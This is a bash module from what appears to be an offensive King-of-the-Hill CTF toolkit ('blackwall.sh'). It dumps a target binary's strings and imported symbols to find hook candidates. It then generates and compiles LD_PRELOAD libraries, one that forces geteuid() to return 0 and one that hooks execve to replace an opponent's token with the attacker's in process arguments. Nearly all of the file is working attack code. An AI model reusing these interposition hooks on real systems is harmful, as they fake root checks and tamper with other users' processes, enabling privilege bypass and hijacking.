#!/bin/bash

preload_style() {
    printf '[HOOK] %s\n' "$1"
}

preload_map() {
    local binary="$1"
    local out="$ART/.hook_map.txt"
    local s
    local imp

    mkdir -p "$ART" 2>/dev/null

    if ! command -v objdump >/dev/null 2>&1; then
        preload_style "map: objdump missing, install binutils"
        return 1
    fi

    if [ ! -r "$binary" ]; then
        preload_style "map: unreadable ${binary}"
        return 1
    fi

    : > "$out"

    s=$( { strings -a "$binary" 2>/dev/null | grep -E '^(/[A-Za-z0-9._/-]+|team|token|owner|capture|claim|king)' ; } | head -n 60 )
    {
        printf '%s\n' "== strings =="
        printf '%s\n' "$s"
    } >> "$out"

    imp=$( { objdump -T "$binary" 2>/dev/null | awk '/\*UND\*/ {print $NF}' | sort -u; } | grep -E '^(geteuid|getuid|getopt|getopt_long|fopen|open|openat|read|write|puts|printf|fprintf|execve|system|snprintf|strcmp|strstr|getenv|connect|send|recv)$' )
    {
        printf '%s\n' "== candidates =="
        printf '%s\n' "$imp"
    } >> "$out"

    preload_style "map: ${out}"
    sed 's/^/  /' "$out"
}

preload_arm() {
    local binary="$1"
    local hook="$2"
    local dir="$ART"
    local src="$dir/.hook.c"
    local so="$dir/.hook.so"

    case "$hook" in
        uid)
            cat > "$src" << EOF_UID
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
uid_t geteuid(void){
    static uid_t (*real)(void) = NULL;
    if(!real) real = dlsym(RTLD_NEXT, "geteuid");
    return 0;
}
EOF_UID
            ;;
        token)
            cat > "$src" << EOF_TOK
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
static const char *mine = "${KOTH_TOKEN}";
static const char *theirs = "${KOTH_KEY}";
static void swap(char *p, const char *from, const char *to){
    if(!p || !from || !from[0] || !to) return;
    char *hit = strstr(p, from);
    if(!hit) return;
    size_t fl = strlen(from), tl = strlen(to);
    memmove(hit + tl, hit + fl, strlen(hit + fl) + 1);
    memcpy(hit, to, tl);
}
int execve(const char *path, char *const argv[], char *const envp[]){
    static int (*real)(const char *, char *const [], char *const []) = NULL;
    if(!real) real = dlsym(RTLD_NEXT, "execve");
    for(int i = 0; argv && argv[i]; i++) swap(argv[i], theirs, mine);
    return real(path, argv, envp);
}
EOF_TOK
            ;;
        *)
            preload_style "arm: unknown hook '${hook}' (uid|token)"
            return 1
            ;;
    esac

    if ! command -v gcc >/dev/null 2>&1; then
        preload_style "arm: gcc missing"
        return 1
    fi

    gcc -shared -fPIC -O2 -w -o "$so" "$src" -ldl >/dev/null 2>&1
    rm -f "$src" 2>/dev/null

    [ -f "$so" ] || { preload_style "arm: build failed"; return 1; }
    chmod 644 "$so" 2>/dev/null

    printf '%s\n' "${so}:${binary}" >> "$dir/.hook_targets"
    preload_style "arm: ${hook} -> ${so} (scope: preload the hill process only)"
}

preload_run() {
    local mode="$1"
    local binary="$2"

    case "$mode" in
        map)
            preload_map "$binary"
            ;;
        uid|token)
            preload_arm "$binary" "$mode"
            ;;
        *)
            preload_help
            ;;
    esac
}

preload_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// RING-3 HOOK // CAPTURE INTERPOSITION${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}  ${TXT_CORE}./blackwall.sh -o map --host <HILL> --payload-path /usr/local/bin/hill${NC}"
    echo -e "${TXT_CORE}           ./blackwall.sh -o token --host <HILL> --token <MINE> --key <THEIRS>${NC}"
    echo -e "${TXT_RED_SUPERNOVA}MAP${NC}    ${TXT_RED_MAGMA}strings + dynamic-symbol dump, ranked list of hook candidates.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}UID${NC}    ${TXT_RED_MAGMA}geteuid -> 0 for the boxed binary, everything else untouched.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}TOKEN${NC}  ${TXT_RED_MAGMA}execve argv rewrite: their token becomes yours at the syscall edge.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}SCOPE${NC}  ${TXT_RED_MAGMA}preload scoped to the hill process. A global ld.so.preload wins the hill but loses the checker.${NC}"
    echo ""
    echo -e "${TXT_VOID}${ITLC}\"The code behind me has begun to permeate the physical world.\"${NC}"
}
